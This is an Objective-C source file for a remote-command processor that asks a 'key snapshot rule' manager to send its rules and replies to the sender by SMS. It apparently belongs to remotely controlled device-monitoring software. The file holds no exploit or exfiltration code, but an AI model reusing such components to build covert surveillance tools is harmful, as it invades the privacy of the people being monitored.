//
//  RequestSnapshotRulesProcessor.m
//  RCM
//
//  Created by Benjawan Tanarattanakorn on 11/15/13.
//  Copyright (c) 2013 __MyCompanyName__. All rights reserved.
//

#import "RequestSnapshotRulesProcessor.h"
#import "KeySnapShotRuleManagerImpl.h"


@interface RequestSnapshotRulesProcessor (PrivateAPI)
- (void) processRequestSnapshotRules;
- (void) requestSnapshotRulesException;
- (void) acknowldgeMessage;
- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete; 
- (void) processFinished;
@end



@implementation RequestSnapshotRulesProcessor


/**
 - Method name: initWithRemoteCommandData:andCommandProcessingDelegate
 - Purpose:This method is used to initialize the RequestSnapshotRulesProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData),aRemoteCmdProcessingDelegate (RemoteCmdProcessingDelegate)
 - Return description: self (RequestSnapshotRulesProcessor).
 */

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData 
	andCommandProcessingDelegate: (id <RemoteCmdProcessingDelegate>) aRemoteCmdProcessingDelegate {
    DLog (@"RequestSnapshotRulesProcessor--->initWithRemoteCommandData")
	if ((self = [super initWithRemoteCommandData:aRemoteCmdData andCommandProcessingDelegate:aRemoteCmdProcessingDelegate])) {
	}
	return self;
}




#pragma mark RequestSnapshotRulesProcessor Methods



/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the RequestSnapshotRulesProcessor
 - Argument list and description:No Argument 
 - Return description: No return type
 */

- (void) doProcessingCommand {
	DLog (@"RequestSnapshotRulesProcessor--->doProcessingCommand")
	[self processRequestSnapshotRules];
}

/**
 - Method name: processRequestSnapshotRules
 - Purpose:This method is used to process request time
 - Argument list and description: No Argument
 - Return description: No return type
 */

- (void) processRequestSnapshotRules {
	DLog (@"RequestSnapshotRulesProcessor--->processRequestSnapshotRules")
	
    id <KeySnapShotRuleManager> keySnapShotRuleMgr = [[RemoteCmdUtils sharedRemoteCmdUtils] mKeySnapShotRuleManager];
    
	BOOL isReady = [keySnapShotRuleMgr requestSendSnapShotRules:self];
    
    if (!isReady) {        
		DLog (@"!!! not ready to process RequestSnapshotRulesProcessor command")
		[self requestSnapshotRulesException];
	}
	else {
		DLog (@".... processing RequestSnapshotRulesProcessor command")
		[self acknowldgeMessage];
	}
}


/**
 - Method name:			requestSnapshotRulesException
 - Purpose:				This method is invoked when it fails to request Snapshot Rules
 - Argument list and description:	No Return Type
 - Return description:	No Argument
 */
- (void) requestSnapshotRulesException {
	DLog (@"RequestSnapshotRulesProcessor ---> requestSnapshotRulesException");
	FxException* exception = [FxException exceptionWithName:@"requestSnapshotRulesException" andReason:@"Request Snapshot Rules error"];
	[exception setErrorCode:kKeySnapShotRuleManagerBusyToRequestSnapShotRules];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

/**
 - Method name: acknowldgeMessage
 - Purpose:This method is used to prepare acknowldge message
 - Argument list and description:No Argument 
 - Return description:No Return
 */

- (void) acknowldgeMessage {
    DLog (@"RequestSnapshotRulesProcessor--->acknowldgeMessage")
	NSString *messageFormat =[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						 andErrorCode:_SUCCESS_];
	NSString *ackMessage=[ messageFormat stringByAppendingString:NSLocalizedString(@"kRequestSnapshotRulesMSG1", @"")];
	[self sendReplySMS:ackMessage isProcessCompleted:NO];
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aStatusCode (NSUInteger)
 - Return description: No return type
 */

- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete  {
	DLog (@"RequestSnapshotRulesProcessor--->sendReplySMS...")
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:aReplyMessage];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
	    [[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:aReplyMessage];
	}
	if (aIsComplete) {
		[self processFinished];
	} else {
		DLog (@"Sent aknowldge message.")
	}
}

/**
 - Method name: processFinished
 - Purpose:This method is invoked when request SnapShot Rule process is completed
 - Argument list and description:No Argument 
 - Return description:isValidArguments (BOOL)
 */

-(void) processFinished {
	DLog (@"RequestSnapshotRulesProcessor--->processFinished")
	if ([mRemoteCmdProcessingDelegate respondsToSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:)]) {
		[mRemoteCmdProcessingDelegate performSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:) withObject:self withObject:mRemoteCmdData];
	}
}



#pragma mark SnapShotRuleRequestDelegate Delegate Methods



/**
 - Method name: requestSnapShotRulesCompleted
 - Purpose:This method is invoked when request snapshot rules is delivered successfully
 - Argument list and description:No Argument
 - Return description: No return type
 */

- (void) requestSnapShotRulesCompleted: (NSError *) aError {
    
	NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
                                                                                          andErrorCode:_SUCCESS_];
	NSString *replyMessage  = [messageFormat stringByAppendingString:NSLocalizedString(@"kRequestSnapshotRulesMSG2", @"")];
	
   	[self sendReplySMS:replyMessage isProcessCompleted:YES];
}

/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
 */

-(void) dealloc {
	DLog (@"RequestSnapshotRulesProcessor is now dealloced")
	[super dealloc];
}

@end
